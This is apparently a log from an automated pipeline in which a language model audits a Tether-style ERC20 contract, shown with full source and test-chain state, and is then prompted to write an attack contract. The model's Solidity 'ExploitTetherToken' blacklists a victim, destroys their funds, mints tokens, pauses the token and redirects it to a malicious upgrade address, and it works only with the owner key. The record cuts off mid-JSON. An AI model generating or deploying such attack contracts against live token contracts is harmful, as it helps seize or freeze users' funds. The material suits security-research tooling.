\n  - Pause the contract to freeze all transfers.  \n\n- Without owner control, no direct vulnerabilities allow stealing tokens or bypassing restrictions.  \n- Users must trust the owner not to abuse these powerful administrative functions.', 'analysis_duration': 27.562653064727783}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and fee parameters. It inherits from several contracts:  \n- Ownable: ownership management  \n- BasicToken and StandardToken: ERC20 token logic with fee deduction on transfers  \n- Pausable: emergency stop mechanism controlled by owner  \n- BlackList: ability to blacklist addresses and destroy their token balances  \n- UpgradedStandardToken interface: for forwarding calls to an upgraded token contract if deprecated  \n\nKey features and logic:  \n- The token supply is initially assigned to the owner.  \n- Transfers and transferFrom apply fees (basisPointsRate and maximumFee), which go to the owner.  \n- The contract can be paused/unpaused by the owner, disabling transfers when paused.  \n- Blacklisted addresses cannot transfer tokens, and their balances can be destroyed by the owner.  \n- The contract supports deprecation: forwarding calls to a new upgraded contract address.  \n- Owner can issue new tokens or redeem tokens from their balance.  \n- Fee parameters are capped (basisPointsRate < 20, maximumFee < 50 tokens).  \n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.\n\nVulnerability Assessment: **A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the contract.  \n- This centralization means users must fully trust the owner not to abuse these powers.  \n- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  \n- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  \n\n**B. Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  \n- There is no mechanism for the blacklisted user to contest or recover funds.  \n- Blacklisting is controlled solely by the owner, no multisig or governance.  \n\n**C. Deprecated Contract Upgrade Mechanism**  \n- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  \n- The upgrade address is trusted and controlled by the owner.  \n- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  \n- No user consent or governance over upgrade.  \n\n**D. Fee Mechanism**  \n- Fees are deducted on transfers and transferFrom, sent to the owner.  \n- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  \n- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  \n- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  \n\n**E. ERC20 Approve Race Condition**  \n- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is a standard pattern and acceptable.  \n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  \n- No payable functions accepting ETH, so no direct ETH theft risk.  \n\n**G. Pausable Mechanism**  \n- Owner can pause/unpause contract, disabling transfers during pause.  \n- No risk here, but again centralized control.  \n\n---\n\n3.\n\nExploitation Requirements: - To exploit the contract, an attacker would need to gain control of the owner account or compromise the owner‚Äôs private key.  \n- With owner control, the attacker can:  \n  - Blacklist arbitrary addresses and destroy their token balances, causing permanent loss.  \n  - Mint unlimited tokens via `issue()`, causing inflation and devaluing existing tokens.  \n  - Set high fees within allowed limits to extract value from transfers.  \n  - Deprecate the contract and set a malicious upgrade address to hijack token operations.  \n  - Pause the contract to freeze all transfers.  \n\n- Without owner control, no direct vulnerabilities allow stealing tokens or bypassing restrictions.  \n- Users must trust the owner not to abuse these powerful administrative functions.\n\n\nTarget Contract Address: 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': "```solidity\npragma solidity 0.4.17;\n\ncontract ExploitTetherToken {\n    address public owner;\n    TetherToken public token;\n\n    function ExploitTetherToken(address _token) public {\n        owner = msg.sender;\n        token = TetherToken(_token);\n    }\n\n    function attack(address victim, address maliciousUpgrade) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        token.addBlackList(victim);\n\n        // Destroy victim's blacklisted funds\n        token.destroyBlackFunds(victim);\n\n        // Mint huge amount of tokens to attacker\n        token.issue(1000000000 ether);\n\n        // Set max fees within allowed limits (20 basis points, 50 tokens max)\n        token.setParams(20, 50 ether);\n\n        // Pause the contract to freeze transfers\n        token.pause();\n\n        // Deprecate contract and set malicious upgrade address\n        token.deprecate(maliciousUpgrade);\n    }\n}\n\ncontract TetherToken {\n    function addBlackList(address _evilUser) public;\n    function destroyBlackFunds(address _blackListedUser) public;\n    function issue(uint amount) public;\n    function setParams(uint newBasisPoints, uint newMaxFee) public;\n    function pause() public;\n    function deprecate(address _upgradedAddress) public;\n}\n```", 'code': "pragma solidity 0.4.17;\n\ncontract ExploitTetherToken {\n    address public owner;\n    TetherToken public token;\n\n    function ExploitTetherToken(address _token) public {\n        owner = msg.sender;\n        token = TetherToken(_token);\n    }\n\n    function attack(address victim, address maliciousUpgrade) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        token.addBlackList(victim);\n\n        // Destroy victim's blacklisted funds\n        token.destroyBlackFunds(victim);\n\n        // Mint huge amount of tokens to attacker\n        token.issue(1000000000 ether);\n\n        // Set max fees within allowed limits (20 basis points, 50 tokens max)\n        token.setParams(20, 50 ether);\n\n        // Pause the contract to freeze transfers\n        token.pause();\n\n        // Deprecate contract and set malicious upgrade address\n        token.deprecate(maliciousUpgrade);\n    }\n}\n\ncontract TetherToken {\n    function addBlackList(address _evilUser) public;\n    function destroyBlackFunds(address _blackListedUser) public;\n    function issue(uint amount) public;\n    function setParams(uint newBasisPoints, uint newMaxFee) public;\n    function pause() public;\n    function deprecate(address _upgradedAddress) public;\n}", 'code_type': 'solidity', 'attack_duration': 8.818445205688477}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmprvx4kktw.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873536340000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = 